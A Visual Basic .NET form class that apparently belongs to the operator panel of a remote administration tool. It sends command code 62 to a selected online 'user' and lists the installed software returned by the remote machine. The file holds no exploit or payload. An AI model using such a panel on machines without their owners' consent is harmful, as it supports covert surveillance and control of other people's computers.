Public Class Softwaremanager

    Public Sub SplitSoftwareList(ByVal Data As String)
        If Data = Nothing Then
            MsgBox("Couldn't recieve data. Please retry.", MsgBoxStyle.Exclamation)
            Exit Sub
        End If
        ListViewSoftware.Items.Clear()
        Dim lines() = Data.Split({";;;"}, StringSplitOptions.None)
        For Each line In lines
            Dim parts() = line.Split({"|||"}, StringSplitOptions.None)
            Dim item = ListViewSoftware.Items.Add(parts(0), 0)
            For i = 1 To Math.Min(parts.Length - 1, 2)
                Dim PIDcheck As String = parts(i)
                item.SubItems.Add(parts(i))
            Next
        Next
        For Each item As ListViewItem In ListViewSoftware.Items
            If (String.IsNullOrWhiteSpace(item.Text) Or String.IsNullOrEmpty(item.Text)) Then
                item.Remove()
            End If
        Next
        LabelAppCount.Text = CType(ListViewSoftware.Items.Count, String)
    End Sub

    Private Sub ButtonGetSoftware_Click(sender As Object, e As EventArgs) Handles ButtonGetSoftware.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Requesting installed software...")
        ListViewSoftware.Items.Clear()
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteCommand(Main.SelectedUserID & "|62")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Softwaremanager")
        End Try
    End Sub

 
    Private Sub Softwaremanager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        ListViewSoftware.Items.Clear()
    End Sub

End Class